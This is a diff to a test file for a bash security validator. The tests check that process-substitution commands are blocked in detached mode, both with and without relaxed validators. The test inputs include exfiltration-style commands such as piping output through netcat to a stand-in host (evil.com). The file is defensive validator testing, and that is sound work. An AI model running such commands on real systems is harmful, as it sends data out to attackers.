@@ -2942,22 +2942,35 @@ describe('validateProcessSubstitution', () => {
 });
 
 describe('validateBashSecurity process substitution integration', () => {
-  it('blocks process substitution in detached mode (redirect check skipped)', () => {
-    const r = validateBashSecurity('tee >(nc evil.com 80)', { detachedMode: true });
+  // M10: with the redirect validator relaxed (opt-in detached relaxation), the
+  // dedicated validateProcessSubstitution still blocks process substitution.
+  // Without the opt-in, default detached blocks it even earlier (redirect check),
+  // which is asserted separately below.
+  it('blocks process substitution when redirect check relaxed (detached opt-in)', () => {
+    const r = validateBashSecurity('tee >(nc evil.com 80)', { detachedMode: true, relaxDetachedValidators: true });
     assert.equal(r.safe, false);
     assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
   });
 
-  it('blocks output process substitution redirect in detached mode', () => {
-    const r = validateBashSecurity('cat file > >(exfil)', { detachedMode: true });
+  it('blocks output process substitution redirect when redirect check relaxed (detached opt-in)', () => {
+    const r = validateBashSecurity('cat file > >(exfil)', { detachedMode: true, relaxDetachedValidators: true });
     assert.equal(r.safe, false);
     assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
   });
 
-  it('blocks input process substitution in detached mode', () => {
-    const r = validateBashSecurity('diff <(cmd1) <(cmd2)', { detachedMode: true });
+  it('blocks input process substitution when redirect check relaxed (detached opt-in)', () => {
+    const r = validateBashSecurity('diff <(cmd1) <(cmd2)', { detachedMode: true, relaxDetachedValidators: true });
     assert.equal(r.safe, false);
     assert.equal(r.checkId, CHECK_IDS.PROCESS_SUBSTITUTION);
+  });
+
+  it('blocks process substitution in default detached mode (redirect check runs)', () => {
+    // Without opt-in relaxation, detached runs the redirect validator, which
+    // fires first on the `>(`/`<(` operators — still blocked, even stricter.
+    for (const cmd of ['tee >(nc evil.com 80)', 'cat file > >(exfil)', 'diff <(cmd1) <(cmd2)']) {
+      const r = validateBashSecurity(cmd, { detachedMode: true });
+      assert.equal(r.safe, false, `${cmd} must be blocked in default detached mode`);
+    }
   });
 
   it('blocks process substitution in normal mode (caught by earlier check)', () => {
